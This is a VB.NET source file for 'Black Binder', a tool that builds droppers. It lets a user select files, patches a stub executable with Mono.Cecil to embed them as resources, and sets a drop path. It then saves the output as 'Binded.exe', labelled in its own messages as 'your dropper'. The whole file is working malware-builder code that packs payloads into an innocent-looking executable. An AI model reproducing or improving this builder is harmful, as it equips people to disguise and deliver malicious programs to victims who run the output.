Imports BlackBinder.NSListView
Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.IO.Compression
Imports System.Text

Public Class Form1
    Dim f As New OpenFileDialog
    Dim dialog As New SaveFileDialog
    Dim a As New OpenFileDialog

    Private Sub NsButton1_Click(sender As Object, e As EventArgs) Handles NsButton1.Click
        With f
            .Title = "Please Select a File"
            .Filter = "Files (*.*)|*.*"
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                NsListView1.AddItem(f.FileName)
            End If
        End With
    End Sub

    Private Sub NsButton2_Click(sender As Object, e As EventArgs) Handles NsButton2.Click
        If Not File.Exists((Path.Combine(Application.StartupPath, "stub.exe"))) Then
            Interaction.MsgBox("Stub Not Found.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        Else
            Dim definition As AssemblyDefinition
            definition = AssemblyDefinition.ReadAssembly(Path.Combine(Application.StartupPath, "stub.exe"))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString

                                        If (str = "[BinderStatus]") Then
                                            current.Operand = "True"

                                            For Each n As NSListViewItem In NsListView1.Items
                                                Dim info As New FileInfo(n.Text)
                                                Dim res = New EmbeddedResource(info.Name, ManifestResourceAttributes.Private, File.ReadAllBytes(n.Text))

                                                definition.MainModule.Resources.Add(res)
                                            Next
                                        End If
                                        If (str = "[DropperPath]") Then
                                            current.Operand = NsComboBox1.Text
                                        End If

                                    End If
                                Loop
                            Finally
                            End Try
                        End If
                    Next
                Next
            Next
            With dialog
                .InitialDirectory = Application.StartupPath
                .FileName = "Binded.exe"
                .Filter = "Executable Applications (*.exe)|*.exe"
                .Title = "Choose a place to save your dropper | Black Binder v" & ProductVersion
            End With
            If dialog.ShowDialog = DialogResult.OK Then
                definition.Write(dialog.FileName)
                MsgBox("Your Dropper Has Been Compiled.", MsgBoxStyle.Information, "Done !")
            Else
                Return
            End If
        End If
    End Sub
    Private Sub NsButton3_Click(sender As Object, e As EventArgs) Handles NsButton3.Click
        If NsListView1.SelectedItems.Length >= 1 Then
            NsListView1.RemoveItems(NsListView1.SelectedItems)
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        NsComboBox1.SelectedItem = NsComboBox1.Items.Item(0)
    End Sub
End Class
